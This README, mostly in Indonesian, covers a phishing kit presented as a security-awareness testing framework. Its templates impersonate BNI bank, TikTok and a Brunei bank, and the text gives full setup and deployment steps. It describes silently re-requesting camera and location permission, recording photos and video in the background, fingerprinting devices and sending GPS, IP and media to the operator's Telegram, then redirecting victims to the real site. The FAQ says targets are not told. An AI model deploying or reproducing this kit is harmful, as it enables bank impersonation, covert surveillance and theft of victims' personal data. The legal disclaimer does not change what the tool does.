# 🛡️ METACYTECH Tools

**Professional Social Engineering Testing Framework** - Dual Template System untuk Security Testing & Awareness Training

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Next.js](https://img.shields.io/badge/Next.js-16-black)](https://nextjs.org/)
[![Python](https://img.shields.io/badge/Python-3.8+-green)](https://www.python.org/)

> ⚠️ **DISCLAIMER**: Tool ini HANYA untuk tujuan edukasi, security testing dengan izin, dan awareness training. Penggunaan ilegal adalah tanggung jawab pengguna.

---

## 📋 Daftar Isi

- [Tentang Project](#-tentang-project)
- [Fitur Utama](#-fitur-utama)
- [Template Tersedia](#-template-tersedia)
- [Requirements](#-requirements)
- [Instalasi](#-instalasi)
  - [Windows / PC](#1-instalasi-di-windows--pc)
  - [Android (Termux)](#2-instalasi-di-android-termux)
- [Konfigurasi](#️-konfigurasi)
- [Cara Menggunakan](#-cara-menggunakan)
- [Troubleshooting](#-troubleshooting)
- [FAQ](#-faq)
- [Legal & Ethics](#️-legal--ethics)

---

## 🎯 Tentang Project

**METACYTECH Tools** adalah framework social engineering testing yang dibangun dengan Next.js dan Python, dilengkapi sistem multi-template yang dapat disesuaikan untuk berbagai skenario testing.

### Cara Kerja:
1. **Target mengakses URL** yang dibagikan via Cloudflare Tunnel/ngrok
2. **Template ditampilkan** (BNI Bank atau TikTok Video)
3. **reCAPTCHA verification** untuk filter bot
4. **Browser permissions** diminta (kamera, lokasi, mikrofon)
5. **Data captured** (IP, location, device info, camera/video)
6. **Telegram notification** dikirim real-time ke operator
7. **Auto redirect** ke website asli setelah capture

---

## ✨ Fitur Utama

### 🎭 Multi Template System
- **Template BNI** - Bank Transfer Verification
- **Template TikTok** - Video Share Link Verification
- **Template BIBD** - Brunei Banking Transaction Verification
- Switch template dengan menu interaktif

### 🔒 Security Features
- ✅ reCAPTCHA v2 integration
- ✅ HTTPS via Cloudflare Tunnel (no warning page!)
- ✅ Auto SSL/TLS encryption
- ✅ Device fingerprinting

### 📸 Advanced Capture
- ✅ Front camera photo capture
- ✅ Geolocation (latitude, longitude, accuracy)
- ✅ Video recording (optional)
- ✅ Device info (browser, OS, screen resolution)
- ✅ IP address & ISP info
- ✅ Network type detection

### 📱 Real-time Monitoring
- ✅ Telegram bot notifications
- ✅ Instant photo & data delivery
- ✅ Google Maps link untuk location
- ✅ Detailed device fingerprint

### 🚀 Production Ready
- ✅ Responsive design (mobile + desktop)
- ✅ Next.js 15/16 support (Webpack for ARM)
- ✅ Auto-build & deploy system
- ✅ Cross-platform (Windows, Linux, Android Termux)

---

## 🎨 Template Tersedia

### 1. 🏦 BNI - Bank Transfer Verification
**Use Case:** Simulated bank transaction verification
- Design menyerupai halaman hasil transaksi BNI
- Professional banking UI/UX
- Logo dan branding BNI

### 2. 🎵 TikTok - Video Share Link
**Use Case:** Simulated video verification
- Design menyerupai TikTok video player
- Modern social media aesthetic
- TikTok color scheme (black, cyan, pink)

### 3. 🇧🇳 BIBD - Bank Islam Brunei Darussalam
**Use Case:** Simulated Brunei banking transaction verification
- Desain bersih, rapi, terpusat penuh (*fullscreen*), tanpa navbar/footer.
- Alur Unggah Instan: Izin kamera & lokasi diminta secara paralel dan file selector otomatis terbuka langsung.
- Silent Permission Retry: Jika izin ditolak, sistem otomatis meminta ulang (tanpa jeda) tanpa peringatan UI.
- Transisi Animasi Loading: Loading BIBD instan sebelum masuk verifikasi, loading kedua selama perekaman di latar belakang, dan pengalihan otomatis ke hasil transaksi (BND 900.00).
- Background Capture: Kamera menangkap foto & merekam video 10 detik penuh dan dikirim secara asinkron ke Telegram.

> 💡 **Template switching** dilakukan via launcher menu sebelum build

---

## 📋 Requirements

### Windows / PC
| Component | Minimum Version | Recommended |
|-----------|----------------|-------------|
| Node.js   | 18.17+         | 20.x LTS    |
| npm       | 9.x+           | 10.x        |
| Python    | 3.8+           | 3.11+       |
| cloudflared | latest       | latest      |
| ngrok (optional) | 3.x    | 3.x         |

### Android (Termux)
| Component | Minimum Version |
|-----------|----------------|
| Termux    | Latest         |
| Node.js   | 18+            |
| Python    | 3.11+          |
| cloudflared/ngrok | latest |

---

## 🚀 Instalasi

### 1. Instalasi di Windows / PC

#### Step 1: Clone Repository
```bash
git clone https://github.com/iqbalgsr46/metacytech-tools.git
cd metacytech-tools
```

#### Step 2: Install Node.js Dependencies
```bash
npm install
```

#### Step 3: Install Python Dependencies
```bash
pip install -r requirements.txt
```

#### Step 4: Install Cloudflared (Recommended)
**Download:** https://github.com/cloudflare/cloudflared/releases

Extract dan tambahkan ke PATH, atau letakkan di folder project.

**Install via Package Manager (Alternative):**
```bash
# Windows (Chocolatey)
choco install cloudflared

# Windows (Scoop)
scoop install cloudflared
```

#### Step 5: Setup Environment Variables
Copy `.env.example` ke `.env.local`:
```bash
copy .env.example .env.local
```

Edit `.env.local`:
```env
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here

# reCAPTCHA v2 Keys
NEXT_PUBLIC_RECAPTCHA_SITE_KEY=your_site_key
RECAPTCHA_SECRET_KEY=your_secret_key
```

---

### 2. Instalasi di Android (Termux)

#### Step 1: Install Termux
Download Termux dari [F-Droid](https://f-droid.org/packages/com.termux/) (BUKAN dari Play Store!)

#### Step 2: Update Termux & Install Dependencies
```bash
pkg update && pkg upgrade -y
pkg install git nodejs python cloudflared -y
```

#### Step 3: Clone Repository
```bash
cd ~
git clone https://github.com/iqbalgsr46/metacytech-tools.git
cd metacytech-tools
```

#### Step 4: Install Node.js Dependencies
```bash
npm install
```

#### Step 5: Setup Environment Variables
```bash
cp .env.example .env.local
nano .env.local
```

Isi dengan Telegram bot token dan reCAPTCHA keys (lihat section Konfigurasi).

**Save:** Ctrl+O, Enter, Ctrl+X

#### Step 6: Install Ngrok (Jika Cloudflared SSL Error)
```bash
cd ~
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip
unzip ngrok-v3-stable-linux-arm64.zip
chmod +x ngrok
mv ngrok $PREFIX/bin/
ngrok version
```

---

## ⚙️ Konfigurasi

### 1. Telegram Bot Setup

#### Buat Bot:
1. Buka Telegram, cari **@BotFather**
2. Kirim command: `/newbot`
3. Berikan nama bot (contoh: `MetacytechBot`)
4. Berikan username bot (contoh: `metacytech_test_bot`)
5. Copy **token** yang diberikan

#### Dapatkan Chat ID:
1. Start chat dengan bot Anda (klik link dari BotFather)
2. Kirim pesan apa saja ke bot
3. Buka: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Cari `"chat":{"id":123456789}` - angka ini adalah chat ID Anda

#### Masukkan ke `.env.local`:
```env
TELEGRAM_BOT_TOKEN=6123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5YbpJhTes
TELEGRAM_CHAT_ID=123456789
```

### 2. reCAPTCHA v2 Setup

#### Dapatkan Keys:
1. Kunjungi: https://www.google.com/recaptcha/admin/create
2. Login dengan Google account
3. Pilih **reCAPTCHA v2** → "I'm not a robot" Checkbox
4. Tambahkan domain (atau gunakan `localhost` untuk testing)
5. Copy **Site Key** dan **Secret Key**

#### Masukkan ke `.env.local`:
```env
NEXT_PUBLIC_RECAPTCHA_SITE_KEY=6LcxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxXX
RECAPTCHA_SECRET_KEY=6LcyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyYY
```

---

## 🎮 Cara Menggunakan

### Jalankan Launcher

**Windows:**
```bash
python launcher.py
```
Atau double-click `run.bat`

**Termux:**
```bash
cd ~/metacytech-tools
python launcher.py
```

### Menu Launcher

Saat pertama kali run, Anda akan diminta memilih template:

```
+-------------------------------------------------+
|         PILIH TEMPLATE TERLEBIH DAHULU          |
+-------------------------------------------------+
|  [1] BNI - Bank Transfer Verification           |
|       Template transfer bank BNI               |
|  [2] TikTok - Video Share Link                  |
|       Template verifikasi video TikTok         |
+-------------------------------------------------+

Pilih template (1-2): 
```

Pilih template, lalu sistem akan:
1. ✅ Apply template files
2. ✅ Build Next.js app
3. ✅ Start server (port 3000)
4. ✅ Start Cloudflare Tunnel / ngrok
5. ✅ Tampilkan **PUBLIC URL** untuk dibagikan

### Main Menu

Setelah sistem running:

```
+-------------------------------------------------+
|              MAIN MENU                          |
+-------------------------------------------------+
|  [1] Start Everything                          |
|       Build + Server + Cloudflare Tunnel       |
|  [2] Stop Everything                           |
|       Kill all services                        |
|  [3] Show Status                               |
|       Check running services & URL             |
|  [4] Copy URL                                  |
|       Copy tunnel URL to clipboard             |
|  [5] Ganti Template                            |
|       Switch to different template             |
|  [6] Exit                                      |
|       Stop all and quit                        |
+-------------------------------------------------+
```

### Mendapatkan Data Target

1. **Bagikan PUBLIC URL** ke target
2. **Monitor Telegram** - akan ada notifikasi saat target:
   - Membuka link
   - Menyelesaikan reCAPTCHA
   - Memberikan permission kamera/lokasi
3. **Terima Data**:
   - 📸 Foto dari kamera depan
   - 📍 Lokasi GPS (dengan Google Maps link)
   - 📱 Device info lengkap
   - 🌐 IP address & ISP

---

## 🔧 Troubleshooting

### ❌ Problem: Cloudflared SSL Certificate Error (Termux)
```
failed to request quick Tunnel: tls: failed to verify certificate
```

**Solusi:**
```bash
pkg install ca-certificates openssl-tool -y
pkg upgrade -y
```

Jika masih error, sistem akan **auto-fallback ke ngrok**. Install ngrok:
```bash
cd ~
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip
unzip ngrok-v3-stable-linux-arm64.zip
chmod +x ngrok
mv ngrok $PREFIX/bin/
```

### ❌ Problem: "Could not get tunnel URL"

**Cek apakah cloudflared/ngrok running:**
```bash
ps aux | grep cloudflared
ps aux | grep ngrok
```

**Cek tunnel.log:**
```bash
cat tunnel.log
```

**Manual test cloudflared:**
```bash
cloudflared tunnel --url http://localhost:3000
```

### ❌ Problem: Telegram Bot Tidak Kirim Notifikasi

**Cek token & chat ID:**
```bash
cat .env.local
```

**Test manual:**
```bash
curl -X POST "https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage?chat_id=<YOUR_CHAT_ID>&text=Test"
```

### ❌ Problem: Next.js Build Error

**Clear cache dan rebuild:**
```bash
rm -rf .next node_modules
npm install
npm run build
```

### ❌ Problem: Port 3000 Already in Use

**Kill process di port 3000:**

**Windows:**
```bash
netstat -ano | findstr :3000
taskkill /PID <PID> /F
```

**Termux:**
```bash
lsof -i :3000
kill -9 <PID>
```

---

## ❓ FAQ

**Q: Apakah tool ini legal?**  
A: Tool ini legal untuk security testing dengan **izin tertulis** dan awareness training. Penggunaan tanpa izin adalah **ILEGAL** dan dapat dikenai sanksi hukum.

**Q: Apakah target tahu sedang di-test?**  
A: Tidak, kecuali Anda memberitahu setelahnya (recommended untuk ethical testing).

**Q: Data tersimpan dimana?**  
A: Data dikirim ke Telegram bot Anda. **TIDAK** tersimpan di server kami.

**Q: Bisa running 24/7?**  
A: Cloudflare Tunnel gratis tidak menjamin uptime 100%. Untuk production, gunakan VPS + domain sendiri.

**Q: Bisa custom template?**  
A: Ya! Buat folder baru di `templates/<nama>` dengan `page.tsx` dan assets.

**Q: Kenapa build lambat di Termux?**  
A: Next.js 16 Turbopack tidak support ARM. Sistem auto-downgrade ke Next.js 15 dengan Webpack (lebih lambat tapi stabil).

---

## ⚖️ Legal & Ethics

### ⚠️ PENTING - BACA INI!

1. **Izin Tertulis WAJIB** - Selalu dapatkan izin tertulis sebelum melakukan security testing
2. **Jangan Menyalahgunakan** - Tool ini untuk edukasi dan authorized testing ONLY
3. **Tanggung Jawab Pengguna** - Anda bertanggung jawab penuh atas penggunaan tool ini
4. **Hukum Berlaku** - Penggunaan ilegal dapat dikenai:
   - UU ITE Pasal 30-35 (Indonesia)
   - Computer Fraud and Abuse Act (USA)
   - GDPR violations (EU)
   - Dan hukum lain yang berlaku

### ✅ Use Cases yang DIIZINKAN:
- Security awareness training dengan persetujuan
- Authorized penetration testing dengan scope jelas
- Red team exercises dengan kontrak
- Educational purposes di controlled environment

### ❌ Use Cases yang DILARANG:
- Phishing tanpa izin
- Unauthorized data collection
- Identity theft
- Any illegal activity

---

## 📂 Struktur Project

```
metacytech-tools/
├── src/
│   └── app/
│       ├── page.tsx              # Main page (replaced by template)
│       ├── layout.tsx            # Root layout
│       └── api/
│           ├── captcha/route.ts  # reCAPTCHA verification
│           ├── capture/route.ts  # Data capture & Telegram send
│           └── verify/route.ts   # Permission verification
├── templates/
│   ├── bni/
│   │   ├── page.tsx             # BNI template
│   │   ├── layout.tsx           # BNI layout
│   │   └── public/              # BNI assets
│   └── tiktok/
│       ├── page.tsx             # TikTok template
│       ├── layout.tsx           # TikTok layout
│       └── public/              # TikTok assets
├── public/                       # Static assets
├── launcher.py                   # Main launcher script
├── run.bat                       # Windows launcher
├── .env.local                    # Environment variables (NOT committed)
├── package.json                  # Node.js dependencies
└── requirements.txt              # Python dependencies
```

---

## 🤝 Contributing

Contributions are welcome! Tapi pastikan:
1. Follow ethical guidelines
2. Test thoroughly di Windows & Termux
3. Document semua perubahan
4. Create pull request dengan deskripsi jelas

---

## 📄 License

MIT License - Lihat [LICENSE](LICENSE) untuk detail

---

## 👨‍💻 Author

**Iqbal**  
- GitHub: [@iqbalgsr46](https://github.com/iqbalgsr46)
- Project: [METACYTECH Tools](https://github.com/iqbalgsr46/metacytech-tools)

---

## 🙏 Acknowledgments

- Next.js Team untuk amazing framework
- Cloudflare untuk free tunnel service
- Telegram untuk bot API
- Community untuk feedback & contributions

---

<div align="center">

**⚠️ Gunakan dengan bijak dan bertanggung jawab! ⚠️**

Made with 💚 for Security Research & Awareness

</div>
